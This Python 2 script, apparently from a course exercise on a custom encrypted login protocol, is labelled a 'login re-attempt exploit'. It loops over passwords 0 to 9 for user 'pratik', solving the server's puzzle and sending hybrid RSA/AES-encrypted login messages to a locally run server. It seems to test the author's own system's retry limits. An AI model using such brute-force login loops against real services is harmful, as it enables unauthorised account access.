
# standard
import os
import sys
import socket
import hashlib

# custom
from df_key import DiffieHellman

# installed
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding

BACKEND = default_backend()

####################################

HOST = '0.0.0.0'
PORT = int(sys.argv[1])

RECV = 65535

####################################

def dh_sym_enc(s_key, text, iv):

    xtra_b     = 16 - (len(text) % 16)
    pad_bits   = len(chr(xtra_b)*xtra_b)
    text += chr(xtra_b)*xtra_b
    cipher = Cipher(algorithms.AES(s_key), modes.CBC(iv), backend=BACKEND)
    encryptor = cipher.encryptor()
    ct =  encryptor.update(text) + encryptor.finalize()
        
    return (ct, pad_bits)

####################################
# login re-attempt exploit
####################################

USERNAME = "pratik"

A = DiffieHellman()
DH_CLIENT = str(A.publicKey)

for i in xrange(10):

    password = str(i)

    # 1) send LOGIN (CREATE NEW SOCKET!)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   # CREATING TCP socket and handling exception
    s.connect((HOST, PORT))
    msg = "LOGIN"
    print "sending ----> {}".format(msg)
    s.send(msg)

    # 2) receive puzzle
    puzzle = s.recv(RECV)
    print "got: {}".format(puzzle)
    L = map(int, puzzle.split('+'))
    result = (L[0] ^ L[1]) / L[2] - L[3]

    # 3) send solution
    c2          = '---'
    key         = os.urandom(32)
    hsh_pwd     = hashlib.sha512(password).hexdigest()
    usr_pub_key = USERNAME + "_public_key"
    pub_key     = open(usr_pub_key, "rb").read()
    dump1       = str(result) + "qwerty" + c2 + "qwerty" + USERNAME + "qwerty" + hsh_pwd + "qwerty" + DH_CLIENT + "qwerty" + pub_key + "qwerty"

    iv          = os.urandom(16)
    ciphertext, pad_bits =  dh_sym_enc(key, dump1, iv)

    # Message encryption

    with open("server_public_key", "rb") as key_file:

        ser_pub_key = serialization.load_pem_public_key(key_file.read(), backend=default_backend()) 
    sym_enc = ser_pub_key.encrypt(key, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA1()), algorithm=hashes.SHA1    (),label=None))     

    dump2   = ciphertext + "qwerty" + sym_enc + "qwerty" + iv + "qwerty" + str(pad_bits)
    print "sending ---> {}".format(repr(dump2)[:20] + '...')
    s.send(dump2)

    # 4) check response
    print "got: {}".format(s.recv(RECV))
